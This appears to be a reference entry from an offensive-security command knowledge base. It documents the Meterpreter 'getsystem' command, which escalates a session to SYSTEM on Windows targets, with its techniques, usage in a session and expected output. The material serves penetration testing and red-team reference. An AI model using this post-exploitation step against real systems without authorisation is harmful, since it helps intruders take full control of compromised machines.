---
id: 1a655f3b-781f-4fad-b7bc-5c4df86ebce5
name: meterpreter-getsystem-elevate-to-system
type: command
executor: meterpreter
data: getsystem
output: null
created_at: '2023-04-06T03:56:21.365940+00:00'
updated_at: '2023-04-10T20:25:01.616349+00:00'
platforms:
  - Windows
tags:
  - privilege-escalation
  - meterpreter
  - metasploit
verified: true
validated: true
---

# meterpreter-getsystem-elevate-to-system

## Command

```meterpreter
getsystem
```

## Description

This command, executed within a Meterpreter session, attempts to elevate the current process privileges to SYSTEM level on Windows targets. It sequentially tries multiple techniques including named pipe impersonation, token duplication, and UAC bypass until success or exhaustion of methods.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| None | The command takes no parameters or arguments. | N/A |

## Examples

### Basic Usage

```meterpreter
getsystem
```

### Usage in Session

After establishing a Meterpreter session via `sessions -i 1`, enter the session and run:

```meterpreter
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
```

## Expected Output

On success with named pipe impersonation:

```
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
```

If all techniques fail:

```
[-] get system failed
```

## Related

- [[commands/meterpreter-getuid-check-user-context]]
- [[procedures/meterpreter-getsystem-privilege-escalation]]
